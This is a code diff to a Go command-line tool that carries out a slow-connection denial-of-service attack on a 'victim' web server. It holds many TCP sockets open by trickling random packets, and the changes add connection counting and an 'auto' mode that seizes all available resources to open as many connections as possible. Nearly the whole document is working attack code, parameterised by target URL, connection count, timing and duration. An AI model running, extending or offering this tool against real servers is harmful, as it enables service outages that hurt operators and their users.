@@ -14,11 +14,13 @@ import (
 )
 
 type attackParams struct {
-	serverURL     *url.URL
-	connectionsNr *uint64
-	timeout       *uint64
-	agents        []string
-	duration      *uint64
+	serverURL *url.URL
+	maxConn   *uint64
+	currConn  *uint64
+	timeout   *uint64
+	agents    []string
+	duration  *uint64
+	auto      *bool
 }
 
 type connection struct {
@@ -30,13 +32,20 @@ type connection struct {
 func main() {
 	attack := parseArguments()
 	quit := make(chan bool)
-	cons := int(*attack.connectionsNr)
+	cons := int(*attack.maxConn)
 	host := attack.serverURL.Hostname()
 	port := attack.serverURL.Port()
 	endpoint, tcperr := net.ResolveTCPAddr("tcp", host+":"+port)
 	if tcperr != nil {
 		log.Fatalf("%v\n", tcperr)
 	}
+	currConnections := uint64(0)
+	attack.currConn = &currConnections
+
+	defer func() {
+		close(quit)
+		log.Println("Exiting the program")
+	}()
 
 	i := 0
 	for ; i <= cons; i++ {
@@ -61,23 +70,25 @@ func main() {
 
 			break
 		} else {
-			go connection.start(attack.timeout, quit)
+			(*attack.currConn)++
+			go connection.start(attack.currConn, attack.timeout, quit)
 		}
 	}
 
-	go monitor(attack, endpoint, attack.serverURL.Path, i, quit)
+	go monitor(attack, endpoint, i, quit)
 
 	time.Sleep(time.Second * time.Duration(*attack.duration))
-	close(quit)
-
-	log.Println("Exiting the program")
 }
 
 // starts a new routine that continuously sends packets to the server
 // to keep the connection
-func (m *connection) start(timeout *uint64, quit chan bool) {
+func (m *connection) start(counter, timeout *uint64, quit chan bool) {
 	log.Printf("Starting worker for #%d socket\n", m.id)
-	defer m.conn.Close()
+
+	defer func() {
+		m.conn.Close()
+		log.Printf("Stop sending random packets to #%d socket\n", m.id)
+	}()
 
 	log.Printf("Sending initial payload to #%d socket\n", m.id)
 	packet := []byte(*m.payload)
@@ -91,7 +102,6 @@ func (m *connection) start(timeout *uint64, quit chan bool) {
 	for {
 		select {
 		case <-quit:
-			log.Printf("Stop sending random packets to #%d socket\n", m.id)
 			return
 		default:
 			time.Sleep(sleep)
@@ -102,6 +112,7 @@ func (m *connection) start(timeout *uint64, quit chan bool) {
 			_, err = m.conn.Write(randPackets)
 			if err != nil {
 				log.Printf("Failed sending random packet to #%d socket:\n\t%v\n", m.id, err)
+				(*counter)--
 				return
 			}
 
@@ -111,7 +122,7 @@ func (m *connection) start(timeout *uint64, quit chan bool) {
 }
 
 // tries to create as much tcp connections as possible
-func monitor(attack *attackParams, address *net.TCPAddr, path string, id int, quit chan bool) {
+func monitor(attack *attackParams, address *net.TCPAddr, id int, quit chan bool) {
 	retry := time.Second * time.Duration(*attack.timeout)
 
 	for {
@@ -121,15 +132,15 @@ func monitor(attack *attackParams, address *net.TCPAddr, path string, id int, qu
 		default:
 			log.Println("Trying to open a new socket from the monitor routine...")
 
-			connection, err := createConnection(address, path, attack.agents[rand.Intn(len(attack.agents))], id, quit)
-			if err != nil {
+			connection, err := createConnection(address, attack.serverURL.Path, attack.agents[rand.Intn(len(attack.agents))], id, quit)
+			if err != nil && (*attack.maxConn >= *attack.currConn || *attack.auto) {
 				time.Sleep(retry)
 				continue
 			} else {
 				log.Printf("Successfully opened #%d socket\n", id)
 			}
-
-			go connection.start(attack.timeout, quit)
+			(*attack.currConn)++
+			go connection.start(attack.currConn, attack.timeout, quit)
 			id++
 		}
 	}
@@ -163,10 +174,11 @@ func createConnection(address *net.TCPAddr, path, agent string, id int, quit cha
 
 func parseArguments() *attackParams {
 	server := flag.String("s", "http://localhost:8080", "The address of the victim")
-	connectionsNr := flag.Uint64("c", 350, "The number of connections to establish with the victim")
+	connectionsNr := flag.Uint64("c", 5, "The number of connections to establish with the victim")
 	timeout := flag.Uint64("t", 10, "The time between sending packets in every active connection in seconds")
 	agentsPath := flag.String("ap", "agents.txt", "The file name with varius User-Agent headers. Is optional")
 	duration := flag.Uint64("d", 10*60, "The duration of the attack in seconds")
+	auto := flag.Bool("a", false, "Take all resources available automatically")
 	flag.Parse()
 
 	if !strings.Contains(*server, "http://") && !strings.Contains(*server, "https://") {
@@ -194,11 +206,12 @@ func parseArguments() *attackParams {
 	}
 
 	attack := attackParams{
-		serverURL:     victimURL,
-		connectionsNr: connectionsNr,
-		timeout:       timeout,
-		agents:        userAgents,
-		duration:      duration,
+		serverURL: victimURL,
+		maxConn:   connectionsNr,
+		timeout:   timeout,
+		agents:    userAgents,
+		duration:  duration,
+		auto:      auto,
 	}
 
 	return logSetup(&attack)
@@ -206,9 +219,14 @@ func parseArguments() *attackParams {
 
 func logSetup(attack *attackParams) *attackParams {
 	log.Printf("Attack will be performed on [%s]\n", attack.serverURL.String())
-	log.Printf("Will try to establish [%d] connections to the server\n", *attack.connectionsNr)
 	log.Printf("The timeout between messages is [%d] seconds\n", *attack.timeout)
 	log.Printf("The attack will last for [%d] seconds\n", *attack.duration)
+
+	if *attack.auto {
+		log.Println("Will try to use all available resources and establish as many connections as possible")
+	} else {
+		log.Printf("Will try to establish [%d] connections to the server\n", *attack.maxConn)
+	}
 
 	return attack
 }
